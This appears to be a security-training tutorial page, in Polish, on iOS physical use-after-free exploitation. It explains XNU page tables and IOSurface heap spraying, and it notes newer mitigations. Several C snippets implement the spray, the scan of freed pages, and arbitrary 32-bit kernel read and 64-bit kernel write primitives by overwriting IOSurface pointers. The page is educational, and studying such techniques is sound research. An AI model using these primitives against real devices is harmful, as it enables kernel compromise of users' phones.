# iOS Physical Use After Free przez IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Fizyczny use-after-free

To podsumowanie wpisu z [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html). Dalsze informacje o exploitach wykorzystujących tę technikę można znaleźć w [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Zarządzanie pamięcią w XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

Przestrzeń adresowa pamięci wirtualnej dla procesów użytkownika na iOS rozciąga się od **0x0 do 0x8000000000**. Jednak te adresy nie mapują się bezpośrednio na pamięć fizyczną. Zamiast tego jądro używa **tablic stron** do tłumaczenia adresów wirtualnych na rzeczywiste **adresy fizyczne**.

#### Poziomy tablic stron w iOS

Tablice stron są zorganizowane hierarchicznie w trzech poziomach:

1. **L1 Tablica stron (Poziom 1)**:
* Każdy wpis tutaj reprezentuje dużą przestrzeń pamięci wirtualnej.
* Pokrywa **0x1000000000 bajtów** (czyli **256 GB**) pamięci wirtualnej.
2. **L2 Tablica stron (Poziom 2)**:
* Wpis tutaj reprezentuje mniejszy obszar pamięci wirtualnej, konkretnie **0x2000000 bajtów** (32 MB).
* Wpis L1 może wskazywać na tablicę L2, jeśli nie może odwzorować całego regionu samodzielnie.
3. **L3 Tablica stron (Poziom 3)**:
* To najdrobniejszy poziom, gdzie każdy wpis mapuje pojedynczą stronę pamięci **4 KB**.
* Wpis L2 może wskazywać na tablicę L3, jeśli potrzebna jest większa szczegółowość.

#### Mapowanie wirtualnego na fizyczne

* **Mapowanie bezpośrednie (Block Mapping)**:
* Niektóre wpisy w tablicy stron bezpośrednio **mapują zakres adresów wirtualnych** na ciągły zakres adresów fizycznych (jak skrót).
* **Wskaźnik do potomnej tablicy stron**:
* Jeśli potrzebna jest większa kontrola, wpis na jednym poziomie (np. L1) może wskazywać na **potomną tablicę stron** na następnym poziomie (np. L2).

#### Przykład: mapowanie adresu wirtualnego

Powiedzmy, że próbujesz uzyskać dostęp do adresu wirtualnego **0x1000000000**:

1. **Tablica L1**:
* Jądro sprawdza wpis w tablicy L1 odpowiadający temu adresowi wirtualnemu. Jeśli ma on **wskaźnik do tablicy L2**, przechodzi do tej tablicy L2.
2. **Tablica L2**:
* Jądro sprawdza tablicę L2 w poszukiwaniu bardziej szczegółowego mapowania. Jeśli ten wpis wskazuje na **tablicę L3**, przechodzi tam.
3. **Tablica L3**:
* Jądro odczytuje końcowy wpis L3, który wskazuje na **adres fizyczny** właściwej strony pamięci.

#### Przykład mapowania adresów

Jeśli wpiszesz adres fizyczny **0x800004000** do pierwszego indeksu tablicy L2, to:

* Adresy wirtualne od **0x1000000000** do **0x1002000000** będą mapowane na adresy fizyczne od **0x800004000** do **0x802004000**.
* To jest **mapowanie blokowe** na poziomie L2.

Alternatywnie, jeśli wpis L2 wskazuje na tablicę L3:

* Każda strona 4 KB w zakresie wirtualnym **0x1000000000 -> 0x1002000000** byłaby mapowana przez indywidualne wpisy w tablicy L3.

### Fizyczny use-after-free

Fizyczny use-after-free (UAF) występuje, gdy:

1. Proces **alokuje** pewną pamięć jako **do odczytu i zapisu**.
2. **Tablice stron** zostają zaktualizowane, aby zmapować tę pamięć na konkretny adres fizyczny, do którego proces ma dostęp.
3. Proces **dealokuje** (zwalnia) pamięć.
4. Jednak z powodu **błędu** jądro **zapomina usunąć mapowanie** z tablic stron, chociaż oznacza odpowiadającą pamięć fizyczną jako wolną.
5. Jądro może wtedy **ponownie przydzielić tę „zwolnioną” pamięć fizyczną** do innych celów, np. danych jądra.
6. Ponieważ mapowanie nie zostało usunięte, proces wciąż może **odczytywać i zapisywać** tę pamięć fizyczną.

To oznacza, że proces może uzyskać dostęp do **stron pamięci jądra**, które mogą zawierać wrażliwe dane lub struktury, co potencjalnie pozwala atakującemu **manipulować pamięcią jądra**.

### IOSurface Heap Spray

Ponieważ atakujący nie może kontrolować, które konkretne strony jądra zostaną przydzielone do zwolnionej pamięci, używają techniki zwanej **heap spray**:

1. Atakujący **tworzy dużą liczbę obiektów IOSurface** w pamięci jądra.
2. Każdy obiekt IOSurface zawiera **magic value** w jednym ze swoich pól, co ułatwia identyfikację.
3. Skanują one **zwolnione strony**, aby sprawdzić, czy któryś z tych obiektów IOSurface trafił na zwolnioną stronę.
4. Gdy znajdą obiekt IOSurface na zwolnionej stronie, mogą go użyć do **odczytu i zapisu pamięci jądra**.

Więcej informacji na ten temat w [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Należy mieć świadomość, że urządzenia iOS 16+ (A12+) wprowadzają sprzętowe mechanizmy utrudniające (takie jak PPL czy SPTM), które znacząco ograniczają skuteczność technik fizycznego UAF.
> PPL wymusza ścisłe ochrony MMU na stronach związanych z podpisywaniem kodu, uprawnieniami i wrażliwymi danymi jądra, więc nawet jeśli strona zostanie ponownie użyta, zapisy z userlandu lub skompromitowanego kodu jądra do stron chronionych przez PPL są blokowane.
> Secure Page Table Monitor (SPTM) rozszerza PPL, wzmacniając same aktualizacje tablic stron. Zapewnia, że nawet uprzywilejowany kod jądra nie może cicho remapować zwolnionych stron ani manipulować mapowaniami bez przejścia przez bezpieczne sprawdzenia.
> KTRR (Kernel Text Read-Only Region) blokuje sekcję kodu jądra jako tylko do odczytu po uruchomieniu. To uniemożliwia runtime’owe modyfikacje kodu jądra, zamykając istotny wektor ataku, na którym opierają się często fizyczne UAF.
> Ponadto alokacje `IOSurface` są mniej przewidywalne i trudniejsze do zmapowania do regionów dostępnych dla użytkownika, co sprawia, że trik ze skanowaniem „magic value” jest znacznie mniej niezawodny. `IOSurface` jest teraz również chronione uprawnieniami i ograniczeniami sandboxu.

### Krok po kroku procesu Heap Spray

1. **Spray obiektów IOSurface**: Atakujący tworzy wiele obiektów IOSurface ze specjalnym identyfikatorem (wartością "magic").
2. **Skanowanie zwolnionych stron**: Sprawdzają, czy któryś z obiektów został przydzielony na zwolnionej stronie.
3. **Odczyt/Zapis pamięci jądra**: Poprzez manipulację polami obiektu IOSurface uzyskują możliwość wykonania **dowolnych odczytów i zapisów** w pamięci jądra. Pozwala to:
* Użyć jednego pola do **odczytu dowolnej 32-bitowej wartości** w pamięci jądra.
* Użyć innego pola do **zapisania 64-bitowych wartości**, osiągając stabilny **prymityw odczytu/zapisu jądra**.

Generuj obiekty IOSurface z magiczną wartością IOSURFACE\_MAGIC, aby później je wyszukać:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Wyszukaj obiekty **`IOSurface`** na jednej zwolnionej fizycznej stronie:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Osiągnięcie odczytu/zapisu jądra przy użyciu IOSurface

Po uzyskaniu kontroli nad obiektem IOSurface w pamięci jądra (zmapowanym do zwolnionej strony fizycznej dostępnej z userspace), możemy go użyć do **dowolnych operacji odczytu i zapisu w jądrze**.

**Key Fields in IOSurface**

The IOSurface object has two crucial fields:

1. **Use Count Pointer**: Pozwala na **32-bitowy odczyt**.
2. **Indexed Timestamp Pointer**: Pozwala na **64-bitowy zapis**.

Nadpisując te wskaźniki, przekierowujemy je do dowolnych adresów w pamięci jądra, umożliwiając operacje odczytu/zapisu.

#### 32-Bit Kernel Read

Aby wykonać odczyt:

1. Nadpisz **Use Count Pointer**, aby wskazywał na docelowy adres pomniejszony o offset 0x14 bajtów.
2. Użyj metody `get_use_count`, aby odczytać wartość pod tym adresem.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

Aby wykonać zapis:

1. Nadpisz **indexed timestamp pointer**, ustawiając go na docelowy adres.
2. Użyj metody `set_indexed_timestamp`, aby zapisać 64-bitową wartość.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Podsumowanie przebiegu exploita

1. **Trigger Physical Use-After-Free**: Wolne strony są dostępne do ponownego użycia.
2. **Spray IOSurface Objects**: Alokuj wiele obiektów IOSurface z unikalną "magic value" w pamięci jądra.
3. **Identify Accessible IOSurface**: Zlokalizuj IOSurface na zwolnionej stronie, którą kontrolujesz.
4. **Abuse Use-After-Free**: Zmodyfikuj wskaźniki w obiekcie IOSurface, aby umożliwić dowolne **kernel read/write** za pomocą metod IOSurface.

Dzięki tym prymitywom exploit zapewnia kontrolowane **32-bit reads** i **64-bit writes** w pamięci jądra. Kolejne kroki jailbreak mogą obejmować bardziej stabilne prymitywy read/write, które mogą wymagać obejścia dodatkowych zabezpieczeń (np. PPL na nowszych urządzeniach arm64e).

{{#include ../../banners/hacktricks-training.md}}
